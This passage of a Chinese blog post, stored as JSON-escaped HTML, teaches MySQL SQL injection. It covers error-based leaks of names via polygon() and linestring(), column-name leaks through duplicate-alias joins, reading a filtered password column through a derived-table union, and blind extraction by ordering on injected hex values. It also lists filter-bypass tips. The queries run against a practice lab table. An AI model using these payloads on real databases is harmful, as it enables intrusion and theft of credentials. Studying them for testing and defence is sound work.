exist</code></pre><p>爆列名使用<code>polygon</code>和<code>linestring</code>函数。翻阅文档可知</p>\n<blockquote>\n<p>Constructs a Polygon value from a number of LineString or WKB LineString arguments. If any argument does not represent a LinearRing (that is, not a closed and simple LineString), the return value is NULL. </p>\n</blockquote>\n<p>如果我们传入存在字段的话就会爆出库，表，列。</p>\n<pre><code>mysql&gt; select * from users where id=1 and polygon(id);\nERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing\nmysql&gt; select * from users where id=1 and linestring(id);\nERROR 1367 (22007): Illegal non geometric &apos;`security`.`users`.`id`&apos; value found during parsing</code></pre><p>爆字段名我们通过命名别名的方式。使用别名的时候表中不能出现相同的字段名，于是我们就利用join把表扩充成两份，在最后别名c的时候 查询到重复字段，就成功报错，从而爆出字段名，再使用<code>using</code>函数以此爆出其他字段名。</p>\n<pre><code>mysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b)as c);\nERROR 1060 (42S21): Duplicate column name &apos;id&apos;\nmysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id))as c);\nERROR 1060 (42S21): Duplicate column name &apos;username&apos;\nmysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username))as c);\nERROR 1060 (42S21): Duplicate column name &apos;password&apos;\nmysql&gt; select * from users where id=1 and (select * from (select * from users as a join users as b using(id,username,password))as c);\nERROR 1241 (21000): Operand should contain 1 column(s)</code></pre><p>如果过滤了字段名，比如 password 我们可以通过以下方法得到数据</p>\n<pre><code>mysql&gt; select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e;\n\n+------------+\n| 3           |\n+------------+\n| 3           |\n| Dumb        |\n| I-kill-you |\n| p@ssword   |\n| crappy      |\n| stupidity  |\n| genious     |\n| mob!le      |\n| admin       |\n| admin1      |\n| admin2      |\n| admin3      |\n| dumbo       |\n| admin4      |\n| 789          |\n+------------+\n\nmysql&gt; select * from users where id=1 union select 1,(select e.3 from (select * from (select 1)a,(select 2)b,(select 3)c union select * from users)e limit 1 offset 2),3;\n\n+----+------------+----------+\n| id | username   | password |\n+----+------------+----------+\n|  1 | Dumb         | Dumb      |\n|  1 | I-kill-you | 3         |\n+----+------------+----------+</code></pre><p>原理是通过建立虚表e，虚表e里的第三列储存了password字段信息，我们通过偏移来使该字段信息显示在没被过滤的username字段中。</p>\n<p>还有一种方法是盲注</p>\n<p>现在我们的表里有一条数据</p>\n<pre><code>mysql&gt; select * from users where id=15;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n| 15 | admin#   | 789  |\n+----+----------+----------+</code></pre><p>我们通过盲注的方式进行查询。</p>\n<pre><code>mysql&gt; select * from users where id=15 union select 1,2,0x38 order by 3 desc;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n|  1 | 2        | 8        |\n| 15 | admin#   | 789      |\n+----+----------+----------+\n2 rows in set (0.00 sec)    \n\nmysql&gt; select * from users where id=15 union select 1,2,0x37 order by 3 desc;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n| 15 | admin#   | 789  |\n|  1 | 2| 7|\n+----+----------+----------+\n2 rows in set (0.00 sec)\n\nmysql&gt; select * from users where id=15 union select 1,2,0x36 order by 3 desc;\n+----+----------+----------+\n| id | username | password |\n+----+----------+----------+\n| 15 | admin#   | 789      |\n|  1 | 2        | 6        |\n+----+----------+----------+\n2 rows in set (0.00 sec)</code></pre><p>order by 3 desc 表示对第三栏进行降序排列。而mysql在比较的时候是从左到右按照字符的ASCII码来比较。</p>\n<p>从结果我们可以看出union select 0x38 时username 回显2,union select 0x37 时username 回显 admin#,union select 0x36时 username 回显admin#,也就是说password的第一位是0x37，也就是7.于是，我们可以通过写脚本来爆破这个位置的值。</p>\n<p>参考链接</p>\n<blockquote>\n<p><a href=\"https://www.secpulse.com/archives/68991.html\" target=\"_blank\" rel=\"noopener\">https://www.secpulse.com/archives/68991.html</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5505#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5505#toc-3</a></p>\n<p><a href=\"https://xz.aliyun.com/t/253\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/253</a></p>\n<p><a href=\"http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/\" target=\"_blank\" rel=\"noopener\">http://www.zhutougg.com/2017/04/25/mysqlshu-ju-ku-de-innodbyin-qing-de-zhu-ru/</a></p>\n</blockquote>\n<ul>\n<li>union select：堆叠注入</li>\n<li>注释符过滤 让最后查询语句最后一个字符为数字即<code>id=1&#39; or &#39;1</code></li>\n<li>and or ^ | &amp; 相互转换</li>\n<li>获取当前数据库  1’ adn asdf();</li>\n</ul>\n","categories":[],"tags":[]}